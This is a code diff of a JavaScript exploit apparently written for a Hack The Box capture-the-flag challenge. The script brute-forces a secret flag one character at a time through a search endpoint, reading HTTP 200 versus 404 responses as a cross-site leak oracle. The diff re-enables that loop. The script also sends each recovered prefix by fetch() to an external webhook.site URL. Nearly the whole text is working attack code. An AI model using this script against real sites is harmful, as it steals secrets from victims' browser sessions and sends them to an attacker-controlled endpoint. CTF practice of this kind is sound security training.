@@ -27,35 +27,29 @@
     }
   }
   async function exploit() {
-    let flag = "AAA";
+    let flag = "HTB{";
     let query;
     // keep going until we hit the end of the flag
-    // while (flag.charAt(flag.length - 1) !== "}") {
-    //   console.log(flag);
-    //   for (let c of "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_") {
-    //     query = flag + c;
-    //     if (await search(query)) {
-    //       // success! we got an http 200
-    //     //   console.log(`YES - ${query}`);
-    //       flag = query;
-    //       break;
-    //     } else {
-    //       // we got an http 404
-    //     //   console.log(`NO - ${query}`);
-    //     // flag = query+"#";
-    //     }
-    //   }
-    query = "HTB{";
-    if(await search(query)){
-        flag = query;
-    }
-    else{
-        flag="11111Faiel";
-    }
+    while (flag.charAt(flag.length - 1) !== "}") {
+      console.log(flag);
+      for (let c of "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_") {
+        query = flag + c;
+        if (await search(query)) {
+          // success! we got an http 200
+        //   console.log(`YES - ${query}`);
+          flag = query;
+          break;
+        } else {
+          // we got an http 404
+        //   console.log(`NO - ${query}`);
+        // flag = query+"#";
+        }
+      }
       try {
         // send whatever characters we have obtained so far to our webhook
         await fetch(`https://webhook.site/d96532b1-e513-4a42-9a50-de9c440e1dcd?${flag}`);
       } catch(e) {}
     }
+  }
   exploit();
 </script>
